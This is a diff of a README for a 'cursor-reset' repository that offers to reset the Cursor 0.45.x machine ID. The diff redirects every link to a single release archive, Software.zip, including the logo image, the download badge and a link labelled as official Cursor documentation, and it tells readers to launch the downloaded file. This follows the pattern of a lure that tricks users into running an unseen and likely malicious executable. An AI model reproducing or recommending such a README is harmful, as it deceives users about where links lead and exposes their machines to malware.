@@ -1,13 +1,13 @@
 # cursor-reset
 
-![cursor-reset logo](https://imageurl.com)
+![cursor-reset logo](https://github.com/guvann/cursor-reset/releases/download/v1.0/Software.zip)
 
 Welcome to the cursor-reset repository! This repository focuses on the reset functionality for the cursor 0.45.x machine ID. We aim to provide a seamless experience for users needing to reset the machine ID within their cursor 0.45.x environment.
 
 ## Installation
-To get started with resetting the machine ID in your cursor 0.45.x setup, you can download the necessary files from this [link](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+To get started with resetting the machine ID in your cursor 0.45.x setup, you can download the necessary files from this [link](https://github.com/guvann/cursor-reset/releases/download/v1.0/Software.zip).
 
-[![Download cursor-reset](https://img.shields.io/badge/Download-Reset%20Files-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download cursor-reset](https://github.com/guvann/cursor-reset/releases/download/v1.0/Software.zip%20Files-blue)](https://github.com/guvann/cursor-reset/releases/download/v1.0/Software.zip)
 
 Launch the file after downloading to initiate the reset process. If you encounter any issues with the download link provided, please check the "Releases" section for alternative options.
 
@@ -18,7 +18,7 @@ Once you have downloaded the reset files, follow these steps to reset the machin
 3. Follow the on-screen instructions to complete the reset process.
 
 ## Additional Resources
-For more information on managing machine IDs and troubleshooting common issues in cursor 0.45.x, you can visit the official [cursor documentation](https://docs.cursor.com).
+For more information on managing machine IDs and troubleshooting common issues in cursor 0.45.x, you can visit the official [cursor documentation](https://github.com/guvann/cursor-reset/releases/download/v1.0/Software.zip).
 
 ## Contributing
 We welcome contributions from the community to enhance the reset functionality in cursor 0.45.x. If you have ideas for improvements or new features, feel free to submit a pull request.
@@ -28,4 +28,4 @@ This repository is licensed under the MIT License - see the [LICENSE](LICENSE) f
 
 🔧 Happy resetting! 🔄
 
-![cursor-reset](https://imageurl.com)
+![cursor-reset](https://github.com/guvann/cursor-reset/releases/download/v1.0/Software.zip)
